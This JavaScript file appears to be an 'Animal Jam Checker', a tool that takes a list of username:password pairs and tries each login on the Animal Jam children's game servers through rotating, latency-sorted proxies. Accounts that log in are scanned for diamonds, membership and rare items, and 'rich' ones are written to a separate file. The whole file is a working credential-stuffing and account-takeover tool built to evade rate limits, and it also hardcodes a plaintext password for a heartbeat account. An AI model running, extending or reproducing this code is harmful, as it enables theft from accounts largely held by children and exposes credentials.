/* 
===========================================================
🐾 Animal Jam Checker — Enhanced QoL Edition (Speed Tuned)
Original Script by: luna_zz
Modified & Expanded by: marchvulture
This revision: persistent flashvars, proxy pre-ping, timeouts,
buffered logging, proxy reuse, and batched writes.
===========================================================
*/

// ============================================
// 🧩 GLOBAL CONFIGURATION
// ============================================
const CONFIG = {
  USE_PROXIES: true,
  QUIET_MODE: false,

  ACCOUNT_DELETE_ENABLED: true,

  // Heartbeat + pacing
  HEARTBEAT_WAIT: 45,
  COOLDOWN_AFTER_ACCOUNT: 5,     // ↓ from 10/20 → faster
  ADAPTIVE_SLEEP: 60000,
  FAILURE_WINDOW_MS: 60000,
  FAILURE_THRESHOLD: 10,

  // Retries / timeouts
  RETRY_LIMIT: 2,
  RETRY_DELAY: 2000,
  TIMEOUT_MS: 8000,              // <— global network timeout cap

  // Logging
  LOG_DIR: './checker-log',
  LOG_SAMPLE_RATE: 0.25,         // write only ~25% of log lines
  LOG_FLUSH_MS: 4000,            // flush buffered logs every 4s

  // Items file
  ITEM_IDS_FILE: 'item_ids.txt',

  // Proxy handling
  PROXY_PING_TIMEOUT_MS: 1000,
  PROXY_REUSE_COUNT: 5,          // reuse the same “good” proxy for N accounts

  // Batch writing
  BATCH_SIZE: 20,                // write results every N accounts
};

// ============================================
// 📦 Imports
// ============================================
import fs from 'fs';
import path from 'path';
import { readFile, writeFile, copyFile, appendFile } from 'fs/promises';
import { AnimalJamClient } from './animaljam.js/dist/index.js';
import { blue, green, yellow, red, cyan } from 'colorette';
import { loadJsonFile, loadJson, CheckClothWorth, sleep } from './utils.js';
import readline from 'readline';
import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';

// Apply a global axios timeout for quick proxy failover
axios.defaults.timeout = CONFIG.TIMEOUT_MS;

// ============================================
// 🧾 Logging (buffered + sampled)
// ============================================
let activeLogDate = null;
let LOG_PATH = null;
let _logBuffer = [];
let _logFlushTimer = null;

function ensureLogDir() { try { fs.mkdirSync(CONFIG.LOG_DIR, { recursive: true }); } catch {} }
function dateStamp() { return new Date().toISOString().slice(0, 10); }
function refreshLogPathIfNeeded() {
  const today = dateStamp();
  if (activeLogDate !== today) {
    activeLogDate = today;
    LOG_PATH = path.join(CONFIG.LOG_DIR, `checker-${today}.txt`);
    try { fs.appendFileSync(LOG_PATH, ''); } catch {}
  }
}
function ts() { return new Date().toLocaleTimeString(); }

function scheduleFlush() {
  if (_logFlushTimer) return;
  _logFlushTimer = setTimeout(async () => {
    try {
      if (_logBuffer.length) {
        const blob = _logBuffer.join('\n') + '\n';
        fs.appendFileSync(LOG_PATH, blob);
        _logBuffer.length = 0;
      }
    } catch {}
    _logFlushTimer = null;
  }, CONFIG.LOG_FLUSH_MS);
}

function writeToLogFile(line) {
  refreshLogPathIfNeeded();
  // sampling
  if (Math.random() > CONFIG.LOG_SAMPLE_RATE) return;
  _logBuffer.push(line);
  scheduleFlush();
}

function log(...args) {
  const line = `[${ts()}] ${args.join(' ')}`;
  writeToLogFile(line);
  if (!CONFIG.QUIET_MODE) console.log(line);
}
function logColor(colorFn, ...args) {
  const line = `[${ts()}] ${args.join(' ')}`;
  writeToLogFile(line);
  if (!CONFIG.QUIET_MODE) console.log(colorFn(line));
}
function banner(msg, colorFn = x => x) {
  const border = '-'.repeat(60);
  const blob = `\n${border}\n${msg}\n${border}`;
  writeToLogFile(`[${ts()}] ${msg}`);
  if (!CONFIG.QUIET_MODE) console.log(colorFn(blob));
}

ensureLogDir();
refreshLogPathIfNeeded();
logColor(green, `📄 Logging to: ${LOG_PATH}`);

// Graceful final flush
async function flushLogs() {
  try {
    if (_logBuffer.length) {
      const blob = _logBuffer.join('\n') + '\n';
      fs.appendFileSync(LOG_PATH, blob);
      _logBuffer.length = 0;
    }
  } catch {}
}

// ============================================
// 🧰 Helpers (timeouts, etc.)
// ============================================
function withTimeout(promise, ms, label = 'op') {
  return Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error(`${label} timeout after ${ms}ms`)), ms))
  ]);
}

// ============================================
// 🌐 Proxies: load, pre-ping, sort by latency, reuse
// ============================================
let proxies = [];
let proxyIndex = 0;
let currentProxy = null;
let currentProxyUses = 0;

async function prePingProxies(list) {
  const results = [];
  for (const raw of list) {
    const url = /^https?:\/\//i.test(raw) ? raw : `http://${raw}`;
    try {
      const agent = new HttpsProxyAgent(url);
      const t0 = Date.now();
      await axios.get('https://www.animaljam.com/ping', { httpsAgent: agent, proxy: false, timeout: CONFIG.PROXY_PING_TIMEOUT_MS });
      results.push({ proxy: raw, latency: Date.now() - t0 });
    } catch {
      // dead proxy, skip
    }
  }
  // Sort by ascending latency (fastest first)
  results.sort((a, b) => a.latency - b.latency);
  return results.map(r => r.proxy);
}

try {
  if (CONFIG.USE_PROXIES) {
    const proxyFile = await readFile('proxies.txt', 'utf8');
    const raw = proxyFile.split('\n').map(p => p.trim()).filter(Boolean);
    logColor(blue, `🔎 Pre-pinging ${raw.length} proxies…`);
    proxies = await prePingProxies(raw);
    logColor(green, `✅ ${proxies.length} live proxies after pre-ping (fastest first).`);
  } else {
    logColor(yellow, '🌐 Proxy use disabled.');
  }
} catch {
  logColor(yellow, '⚠️ No proxies.txt found — running without proxies.');
}

function rotateProxyIfNeeded() {
  if (!CONFIG.USE_PROXIES || !proxies.length) {
    currentProxy = null; return;
  }
  if (!currentProxy || currentProxyUses >= CONFIG.PROXY_REUSE_COUNT) {
    currentProxy = proxies[proxyIndex % proxies.length];
    proxyIndex++;
    currentProxyUses = 0;
  }
  currentProxyUses++;
}
function getActiveProxy() {
  rotateProxyIfNeeded();
  return currentProxy ? currentProxy : null;
}

// ============================================
// 🔐 Heartbeat
// ============================================
const HEARTBEAT_USER = "Officialvulture";
const HEARTBEAT_PASS = "1590WindowsPin";

async function checkServerStatus(globalFlashvars = null) {
  const proxy = getActiveProxy();
  const client = new AnimalJamClient({ proxy });
  try {
    // If caller provided flashvars, skip this fetch entirely
    if (!globalFlashvars) await withTimeout(client.flashvars.fetch(), CONFIG.TIMEOUT_MS, 'flashvars');
    const resp = await withTimeout(
      client.authenticator.login({ screen_name: HEARTBEAT_USER, password: HEARTBEAT_PASS }),
      CONFIG.TIMEOUT_MS,
      'heartbeat-login'
    );
    return !!(resp.auth_token ?? resp.token);
  } catch {
    return false;
  }
}

async function waitForServers(globalFlashvars = null) {
  let down = false;
  while (!(await checkServerStatus(globalFlashvars))) {
    down = true;
    logColor(red, '[HEARTBEAT] Servers offline, waiting...');
    for (let i = CONFIG.HEARTBEAT_WAIT; i > 0; i--) {
      process.stdout.write(`\rRetrying in ${i}s...   `);
      await sleep(1000);
    }
    process.stdout.write('\r'.padEnd(30, ' ') + '\r');
  }
  if (down) logColor(blue, '[HEARTBEAT] Servers back online');
}

// ============================================
// 💎 Rare keyword helper
// ============================================
const RARE_KEYWORDS = [
  'headdress','rare hot magenta','rare spiked collar','blackout','coal','rare spiked wristband',
  'antique','exclusive','terrace','lavender','slime green','rare bright','bright orange',
  'bright red','cyan','whiteout'
];
function containsRareKeyword(name) {
  if (!name) return false;
  const lower = name.toLowerCase();
  return RARE_KEYWORDS.some(k => lower.includes(k));
}

// ============================================
// 🧾 Load item IDs from item_ids.txt
// ============================================
async function loadItemIDs() {
  const clothingIDs = new Set();
  const denIDs = new Set();
  const petIDs = new Set();
  try {
    const file = await readFile(CONFIG.ITEM_IDS_FILE, 'utf8');
    const lines = file.split('\n').map(l => l.trim()).filter(Boolean);
    let section = null;
    for (const line of lines) {
      if (line.startsWith('#clothing')) section = 'clothing';
      else if (line.startsWith('#den')) section = 'den';
      else if (line.startsWith('#pet')) section = 'pet';
      else if (/^\d+$/.test(line)) {
        const id = Number(line);
        if (section === 'clothing') clothingIDs.add(id);
        else if (section === 'den') denIDs.add(id);
        else if (section === 'pet') petIDs.add(id);
      }
    }
    logColor(blue, `Loaded IDs: clothing(${clothingIDs.size}), den(${denIDs.size}), pets(${petIDs.size})`);
  } catch (e) {
    logColor(red, `⚠️ Failed to load ${CONFIG.ITEM_IDS_FILE}: ${e.message}`);
  }
  return { clothingIDs, denIDs, petIDs };
}

// ============================================
// 🔎 Account checker (uses persistent flashvars & timeouts)
// ============================================
async function checkAccount(screen_name, password, clothing, denitems, enstrings, loadedIDs, flashvars) {
  const { clothingIDs, denIDs, petIDs } = loadedIDs;
  const proxy = getActiveProxy();
  const client = new AnimalJamClient({ proxy });

  const auth = await withTimeout(
    client.authenticator.login({ screen_name, password }),
    CONFIG.TIMEOUT_MS,
    'auth'
  );
  if (!auth?.auth_token) return { success: false, reason: 'AUTH_FAIL' };

  const networking = await withTimeout(
    client.networking.createClient({
      host: flashvars.smartfoxServer,
      port: flashvars.smartfoxPort,
      auth_token: auth.auth_token,
      screen_name,
      deploy_version: flashvars.deploy_version,
    }),
    CONFIG.TIMEOUT_MS,
    'createClient'
  );

  let userData = null;
  const clothingRares = new Set();
  const denRares = new Set();
  const petRares = new Set();
  let gotIL = false, gotDI = false;

  networking.on('message', async message => {
    const msg = message.toMessage();

    // broadened detection for all player info types
    if (msg.includes('playerWallSettings') || msg.includes('playerInfo') || msg.includes('playerSettings')) {
      try {
        const jsonData = await loadJson(msg);
        userData = jsonData?.b?.o?.params ?? jsonData?.b?.o;
        console.log(green(`✅ userData received for ${screen_name}`));
      } catch (e) {
        console.log(red(`⚠️ Parse error for ${screen_name}: ${e.message}`));
      }
    }

    if (!gotDI && msg.includes('%di%')) {
      const parts = msg.split('%');
      for (let i = 7; i < parts.length; i++) {
        const id = parseInt(parts[i], 10);
        if (denIDs.has(id)) denRares.add(id);
      }
      gotDI = true;
    }
    if (!gotIL && msg.includes('%il%')) {
      const parts = msg.split('%');
      for (let i = 6; i < parts.length; i++) {
        const id = parseInt(parts[i], 10);
        if (clothingIDs.has(id)) clothingRares.add(id);
        const def = clothing[id];
        if (def?.name && (containsRareKeyword(def.name) || CheckClothWorth(def.name))) {
          clothingRares.add(def.name);
        }
      }
      gotIL = true;
    }
    if (msg.includes('%pl%')) {
      const parts = msg.split('%');
      for (let i = 6; i < parts.length; i++) {
        const id = parseInt(parts[i], 10);
        if (petIDs.has(id)) petRares.add(id);
      }
    }
  });

  // Connect and join a default room to trigger data emission
  await withTimeout(networking.connect(), CONFIG.TIMEOUT_MS, 'connect');
  console.log(cyan(`🌐 Connected to SmartFox for ${screen_name}`));

  try {
    await withTimeout(
      networking.sendXTMessage(['j#js', '-1', 'Township']),
      CONFIG.TIMEOUT_MS,
      'join-room'
    );
    console.log(cyan(`🏙️ Joined Township for ${screen_name}`));
    await sleep(1500);
  } catch (e) {
    console.log(yellow(`⚠️ join-room failed for ${screen_name}: ${e.message}`));
  }

  // Request packets (after joining room)
  await withTimeout(networking.sendXTMessage(['di', '-1']), CONFIG.TIMEOUT_MS, 'send-di');
  await withTimeout(networking.sendXTMessage(['pl', '-1', screen_name]), CONFIG.TIMEOUT_MS, 'send-pl');
  await withTimeout(networking.sendXTMessage(['ad', '-1', screen_name, 1, 1]), CONFIG.TIMEOUT_MS, 'send-ad');
  await withTimeout(networking.sendXTMessage(['il', '-1']), CONFIG.TIMEOUT_MS, 'send-il');

  // Wait longer for slower responses
  let spins = 0;
  while ((!userData || !gotIL || !gotDI) && spins++ < 60) { // up to ~30s
    await sleep(500);
  }

  networking.disconnect?.();

  if (!userData) {
    console.log(red(`❌ ${screen_name} → NO_USERDATA`));
    return { success: false, reason: 'NO_USERDATA' };
  }

  const createdAt = userData?.createdAt ? new Date(Number(userData.createdAt) * 1000).getFullYear() : 'unknown';

  return {
    success: true,
    screen_name,
    diamonds: userData?.diamondsCount ?? 0,
    isMember: userData?.accountType === 2,
    clothingRares: Array.from(clothingRares),
    denRares: Array.from(denRares),
    petName: Array.from(petRares),
    creationYear: createdAt,
  };
}

// ============================================
// 🧾 Accounts, backups, input
// ============================================
async function loadAccounts(file = 'accounts.txt') {
  const raw = await readFile(file, 'utf8');
  return raw.split('\n').map(l => l.trim()).filter(Boolean);
}

async function saveAccounts(file, list) {
  await writeFile(file, list.join('\n'), 'utf8');
}

async function backupAccountsFile() {
  try {
    const BACKUP_DIR = './checker-log';
    if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true });
    const date = new Date().toISOString().split('T')[0];
    const backupPath = path.join(BACKUP_DIR, `accounts_backup_${date}.txt`);

    await copyFile('accounts.txt', backupPath);
    console.log(blue(`💾 Accounts backed up to ${backupPath}`));
  } catch (err) {
    console.log(yellow(`⚠️ Backup skipped: ${err.message}`));
  }
}

async function askStartIndexWithTimeout(max, timeoutMs = 10000) {
  return new Promise(resolve => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    const timer = setTimeout(() => { console.log('\n⏱️ No input—starting at #1'); rl.close(); resolve(0); }, timeoutMs);
    rl.question(`Start at account #? (1-${max}) [default=1]: `, input => {
      clearTimeout(timer); rl.close();
      const idx = parseInt(input, 10);
      resolve(isNaN(idx) || idx < 1 || idx > max ? 0 : idx - 1);
    });
  });
}

// ============================================
// 🚀 Main (persistent flashvars, batch queue)
// ============================================
async function main() {
  await backupAccountsFile();

  // Load static packs once
  const CLOTHING_PATH  = './defpacks/1000-clothing.json';
  const DENITEMS_PATH  = './defpacks/1030-denitems.json';
  const ENSTRINGS_PATH = './defpacks/10230-enstrings.json';
  const clothing  = await loadJsonFile(CLOTHING_PATH);
  const denitems  = await loadJsonFile(DENITEMS_PATH);
  const enstrings = await loadJsonFile(ENSTRINGS_PATH);

  // Load external rare ID lists once
  const loadedIDs = await loadItemIDs();

  // Persistent flashvars (get one good proxy first if needed)
  await waitForServers();
  const clientForFlashvars = new AnimalJamClient({ proxy: getActiveProxy() });
  const flashvars = await withTimeout(clientForFlashvars.flashvars.fetch(), CONFIG.TIMEOUT_MS, 'flashvars-once');

  // Use that in heartbeat too (skips fetch)
  await waitForServers(flashvars);

  // Load accounts & choose start
  let accounts = await loadAccounts('accounts.txt');
  const startIdx = await askStartIndexWithTimeout(accounts.length);
  logColor(blue, `Starting ${startIdx + 1}/${accounts.length}`);

  // Graceful exit handler
  process.on('SIGINT', async () => {
    logColor(red, '🛑 Interrupted — saving progress & flushing logs…');
    try { await saveAccounts('accounts.txt', accounts); } catch {}
    await flushLogs();
    process.exit(0);
  });

  // Batch results buffer
  const RICH_FILE = 'rich-accounts.txt';
  const CLEAN_FILE = 'clean-accounts.txt';
  const batch = [];

  // Loop
  for (let i = startIdx; i < accounts.length; i++) {
    const [screen_name, password] = accounts[i].split(':');
    logColor(blue, `Checking ${screen_name} (${i + 1}/${accounts.length})`);

    // Run the check with persistent flashvars
    let res;
    try {
      res = await checkAccount(screen_name, password, clothing, denitems, enstrings, loadedIDs, flashvars);
    } catch (e) {
      logColor(red, `❌ ${screen_name} error: ${e.message}`);
      res = { success: false, reason: 'EXCEPTION' };
    }

    // Handle result
    if (!res.success) {
      logColor(red, `✗ ${screen_name} → ${res.reason || 'FAILED'}`);
    } else {
      const hasRare = res.clothingRares.length || res.denRares.length || res.petName.length;
      const line = `${screen_name}:${password} | diamonds:${res.diamonds} | member:${res.isMember ? 'yes':'no'} | rares:${hasRare ? 'yes':'no'}`;
      // queue result (batch write)
      batch.push({ line, rich: (res.isMember || hasRare) });

      // optionally remove account after processing
      if (CONFIG.ACCOUNT_DELETE_ENABLED) {
        accounts.splice(i, 1);
        i--; // align index after removal
      }
    }

    // Batch flush
    if (batch.length >= CONFIG.BATCH_SIZE) {
      const richLines  = batch.filter(b => b.rich).map(b => b.line).join('\n') + '\n';
      const cleanLines = batch.filter(b => !b.rich).map(b => b.line.split(' | ')[0]).join('\n') + '\n';
      if (richLines.trim())  await appendFile(RICH_FILE,  richLines,  { flag: 'a' });
      if (cleanLines.trim()) await appendFile(CLEAN_FILE, cleanLines, { flag: 'a' });
      batch.length = 0;
      // persist accounts file less often
      if (CONFIG.ACCOUNT_DELETE_ENABLED) await saveAccounts('accounts.txt', accounts);
    }

    // Cooldown (short)
    await sleep(CONFIG.COOLDOWN_AFTER_ACCOUNT * 1000);
  }

  // Final batch flush
  if (batch.length) {
    const richLines  = batch.filter(b => b.rich).map(b => b.line).join('\n') + '\n';
    const cleanLines = batch.filter(b => !b.rich).map(b => b.line.split(' | ')[0]).join('\n') + '\n';
    if (richLines.trim())  await appendFile(RICH_FILE,  richLines,  { flag: 'a' });
    if (cleanLines.trim()) await appendFile(CLEAN_FILE, cleanLines, { flag: 'a' });
  }

  // Save remaining accounts list once at the end
  if (CONFIG.ACCOUNT_DELETE_ENABLED) await saveAccounts('accounts.txt', accounts);

  await flushLogs();
  banner('✅ Finished all accounts', green);
}

main().catch(async e => { console.error(red('Fatal error:'), e); await flushLogs(); });